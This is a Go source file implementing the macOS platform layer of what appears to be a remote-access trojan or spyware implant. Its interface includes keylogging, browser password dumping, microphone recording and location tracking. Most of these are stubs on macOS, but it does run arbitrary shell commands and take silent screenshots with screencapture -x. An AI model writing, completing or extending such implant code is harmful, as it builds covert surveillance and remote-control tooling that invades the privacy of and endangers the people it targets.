//go:build darwin && !ios

package darwin

import (
	"fmt"
	"os"
	"os/exec"
)

// DarwinPlatform represents the macOS platform.
type DarwinPlatform struct{}

// NewPlatform returns a new instance of the DarwinPlatform.
func NewPlatform() *DarwinPlatform {
	return &DarwinPlatform{}
}

// ExecuteCommand executes a command on macOS.
func (p *DarwinPlatform) ExecuteCommand(command string) ([]byte, error) {
	cmd := exec.Command("sh", "-c", command)
	return cmd.CombinedOutput()
}

// Init does nothing on macOS.
func (p *DarwinPlatform) Init() error {
	return nil
}

// StartKeylogger does nothing on macOS.
func (p *DarwinPlatform) StartKeylogger() {}

// GetKeylogs does nothing on macOS.
func (p *DarwinPlatform) GetKeylogs() string {
	return "Keylogger not implemented for macOS."
}

// DumpBrowsers does nothing on macOS.
func (p *DarwinPlatform) DumpBrowsers() string {
	return "Browser password dumping not implemented for macOS."
}

// Screenshot captures the screen.
func (p *DarwinPlatform) Screenshot() ([]byte, error) {
	// Create a temporary file to store the screenshot
	tmpfile, err := os.CreateTemp("", "screenshot-*.png")
	if err != nil {
		return nil, fmt.Errorf("failed to create temp file for screenshot: %w", err)
	}
	defer os.Remove(tmpfile.Name()) // Ensure the temporary file is deleted

	// Use the 'screencapture' command-line utility without interactive mode
	cmd := exec.Command("screencapture", "-x", tmpfile.Name())
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("failed to run screencapture command: %w", err)
	}

	// Read the screenshot data from the temporary file
	data, err := os.ReadFile(tmpfile.Name())
	if err != nil {
		return nil, fmt.Errorf("failed to read screenshot file: %w", err)
	}

	return data, nil
}

// RecordMicrophone does nothing on macOS.
func (p *DarwinPlatform) RecordMicrophone() ([]byte, error) {
	return nil, fmt.Errorf("microphone recording not implemented for macOS")
}

// GetLocation does nothing on macOS.
func (p *DarwinPlatform) GetLocation() ([]byte, error) {
	return nil, fmt.Errorf("location tracking not implemented for macOS")
}
